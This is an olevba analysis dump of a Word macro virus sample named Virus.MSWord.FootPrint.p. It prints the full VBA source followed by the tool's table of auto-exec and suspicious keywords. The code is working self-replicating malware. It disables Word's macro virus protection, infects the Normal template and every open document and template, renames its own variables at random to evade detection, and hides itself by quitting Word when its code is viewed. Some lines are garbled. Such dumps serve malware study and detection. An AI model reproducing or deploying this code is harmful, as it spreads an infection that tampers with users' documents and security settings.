olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FootPrint.p-acc437a4878d34182ee42b7d0ecb8f7eb03e8c7b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FootPrint.p-acc437a4878d34182ee42b7d0ecb8f7eb03e8c7b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For
= 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next AL3250: End If
PI9186 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CU9793 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH77 = ActiveDocument.VBProject.VBComponents.Item(1)
IA3217 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set AH77 = NormalTemplate.VBProject.VBComponents.Item(1)
CR4768 = True
Call OV1646_NJ830
ActiveDocument.Saved = True
End If
If CR4768 <> True And IA3217 <> True Then GoTo CM2464
If CR4768 = True Then AH77.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PI9186 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If IA3217 = True Then AH77.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CU9793 - 4))
CM2464:
If CU9793 <> 0 And PI9186 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function OV1646_NJ830()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "DR618": r1(2) = "MB872": r1(3) = "KG5522": r1(4) = "IF6887": r1(5) = "NJ830": r1(6) = "PI9186"
r1(7) = "CU9793": r1(8) = "IA3217":: r1(9) = "AH77": r1(10) = "CR4768": r1(11) = "CM2464": r1(12) = "OV1646": r1(13) = "QF861": r1(14) = "HS9530": r1(15) = "AL3250"
For AL3250 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call NJ830(a1, r1(AL3250))
Next AL3250
End Function 'VAMP v1.0 [thanks Vic!]
Private Function NJ830(HS9530, QF861 As String)
On Error Resume Next
Dim DR618 As Long: Dim MB872 As Long: Dim KG5522 As Long: Dim IF6887 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DR618 = 1: MB872 = 1: KG5522 = .CountOfLines: IF6887 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QF861, DR618, MB872, KG5522, IF6887, True)
strline = .Lines(DR618, 1)
strline = Left(strline, MB872 - 1) & HS9530 & Mid(strline, IF6887)
.replaceline DR618, strline
DR618 = KG5522 + 1: MB872 = 1:
KG5522 = .CountOfLines
IF6887 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    If Not adoc.CustomDocumentProperties("FootPrint1") Then
        adoc.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint1") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

